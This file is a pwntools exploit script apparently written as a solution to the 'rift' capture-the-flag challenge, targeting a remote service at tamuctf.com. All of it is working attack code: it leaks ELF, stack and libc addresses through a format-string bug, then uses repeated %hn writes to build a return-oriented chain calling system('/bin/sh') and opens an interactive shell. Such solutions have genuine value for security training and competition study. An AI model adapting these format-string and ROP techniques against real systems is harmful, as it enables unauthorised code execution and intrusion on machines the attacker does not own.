#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rift_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="rift")
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+30
break *printf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def send_fmt(size, offset):
    io.sendline(f'%{size}c%{offset}$hn')

def overwrite():
    write_size = always_true & 0xffff
    send_fmt(write_size, 27)
    
    io.sendline('%41$n')

def pop_rdi():
    pop_rdi = exe.address + 0x000000000000127b # pop rdi; ret; 

    write_size = main_stack_ret & 0xffff
    send_fmt(write_size, 27)
    
    write_size = pop_rdi & 0xffff
    send_fmt(write_size, 41)

    write_size = (main_stack_ret & 0xffff) + 2
    send_fmt(write_size, 27)

    write_size = (pop_rdi & 0xffff0000) >> 16
    send_fmt(write_size, 41)

    write_size = (main_stack_ret & 0xffff) + 4
    send_fmt(write_size, 27)

    write_size = (pop_rdi & 0xffffffff0000) >> 32
    send_fmt(write_size, 41)


def do_system(system):
    addr = main_stack_ret + 0x10

    write_size = addr & 0xffff
    send_fmt(write_size, 27)
    
    write_size = system & 0xffff
    send_fmt(write_size, 41)

    write_size = (addr & 0xffff) + 2
    send_fmt(write_size, 27)

    write_size = (system & 0xffff0000) >> 16
    send_fmt(write_size, 41)

    write_size = (addr & 0xffff) + 4
    send_fmt(write_size, 27)

    write_size = (system & 0xffffffff0000) >> 32
    send_fmt(write_size, 41)

def write(sh):
    addr = main_stack_ret + 0x8
    
    write_size = addr & 0xffff
    send_fmt(write_size, 13)

    write_size = sh & 0xffff
    send_fmt(write_size, 39)

    write_size = (addr & 0xffff) + 2
    send_fmt(write_size, 13)

    write_size = (sh & 0xffff0000) >> 16
    send_fmt(write_size, 39)

    write_size = (addr & 0xffff) + 4
    send_fmt(write_size, 13)

    write_size = (sh & 0xffffffff0000) >> 32
    send_fmt(write_size, 39)


def ropme():
    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    ret = exe.address + 0x0000000000001016 # ret; 

    pop_rdi()
    write(sh)
    do_system(system)
    overwrite()


def solve():
    global always_true, main_stack_ret

    io.sendline("%2$p.%6$p.%11$p")
    leak = io.recvline().split(b'.')
    exe.address = int(leak[0], 16) - exe.sym['buf']
    main_stack_ret = int(leak[1], 16) - 0xd8
    always_true = int(leak[1], 16) - 0xf4
    libc.address = int(leak[2], 16) - libc.sym['__libc_start_main'] - 235

    info("elf base: %#x", exe.address)
    info("libc base: %#x", libc.address)
    info("main stack return: %#x", main_stack_ret)
    info("var always_true: %#x", always_true)

    ropme()

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
